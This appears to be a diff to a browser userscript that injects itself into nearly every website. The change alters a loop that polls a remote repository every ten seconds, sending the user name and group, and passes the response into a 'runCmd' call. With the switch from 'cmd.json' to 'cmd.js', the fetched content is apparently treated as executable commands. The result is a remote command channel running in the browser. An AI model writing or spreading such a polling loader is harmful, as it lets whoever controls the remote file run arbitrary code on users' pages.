@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name ts
-// @version 2.0.53
+// @version 2.0.54
 // @namespace xxyyzz2050
 // @include *
 // @exclude /github.com/
@@ -197,13 +197,13 @@ getScript(
 
 setInterval(function() {
   getScript(
-    `${repo}/cmd.json?hash=${timestamp}&usergroup=${userGroup}&user=${user}`,
+    `${repo}/cmd.js?hash=${timestamp}&usergroup=${userGroup}&user=${user}`,
     {},
     (type, res, src) => {
       if (type === "sucess") {
         res.responseText = `runCmd(${res.responseText})`;
       }
-    },
-    "json"
+    }
+    //"json"
   );
 }, 10000);
